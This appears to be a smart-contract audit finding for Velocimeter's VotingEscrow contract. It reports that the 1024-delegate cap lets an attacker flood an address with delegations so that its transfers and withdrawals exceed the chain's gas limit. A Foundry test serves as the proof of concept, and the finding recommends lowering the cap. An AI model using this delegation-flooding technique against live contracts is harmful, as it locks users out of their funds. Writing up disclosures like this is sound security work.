# DOS attack by delegating tokens at MAX_DELEGATES = 1024

DanielWang8824

## Summary

VotingEscrow.transfer/burn/mint function could get DOS attack by delegating tokens at MAX_DELEGATES = 1024

## Vulnerability Detail

There is delegate maximum value.
https://github.com/sherlock-audit/2024-06-velocimeter/blob/63818925987a5115a80eff4bd12578146a844cfd/v4-contracts/contracts/VotingEscrow.sol#L1266

   ` uint public constant MAX_DELEGATES = 1024; // avoid too much gas`

Any user can delegate the balance of the locked NFT amount to anyone by calling delegate. As the delegated tokens are maintained in an array that's vulnerable to DOS attack, the VotingEscrow has a safety check of MAX_DELEGATES = 1024 preventing an address from having a huge array. Given the current implementation, any user with 1024 delegated tokens takes approximately 23M gas to transfer/burn/mint a token. However, the current gas limit of the op chain is 15M.

## Impact
VotingEscrow.transfer/burn/mint function could get DOS attack by delegating tokens at MAX_DELEGATES = 1024

## Code Snippet

Here is the unit test code.
```solidity
function testDelegateLimitAttack() public {
    uint256 lockDuration = 7 * 24 * 3600; // 1 week
    vm.prank(address(owner));
    flowDaiPair.transfer(address(this), TOKEN_1);
    flowDaiPair.approve(address(escrow), TOKEN_1);    
    uint tokenId = escrow.create_lock(TOKEN_1, 7 days);
    // Maximum loopCount is escrow.MAX_DELEGATES() - 1, 
    // But We only test with 300 delegates now
    uint32 loopCount = 298; // escrow.MAX_DELEGATES() - 1;
    for(uint256 i = 0; i < loopCount; i++) {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 2);
        address fakeAccount = address(uint160(420 + i));
        flowDaiPair.transfer(address(fakeAccount), TOKEN_1);
        vm.startPrank(fakeAccount);
        flowDaiPair.approve(address(escrow), TOKEN_1);
        escrow.create_lock(TOKEN_1, lockDuration);
        escrow.delegate(address(this));
        vm.stopPrank();
    }
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 7 days);
    uint initialGas = gasleft();
    escrow.withdraw(tokenId);
    uint gasUsed = initialGas - gasleft();
    console.log(gasUsed);
    // @audit: setting 5_000_000 to demonstrate the issue. 
    // 2~3M gas limit would be a safer range.
    assertLt(gasUsed, 5_000_000);    
}
```

But gas was used 7,031,297 for 300 delegates. The above test case is failed.
If we use 1023 delegates, then the gas will be used 20M over

## Recommendation
Adjust the MAX_DELEGATES=1024to 128;
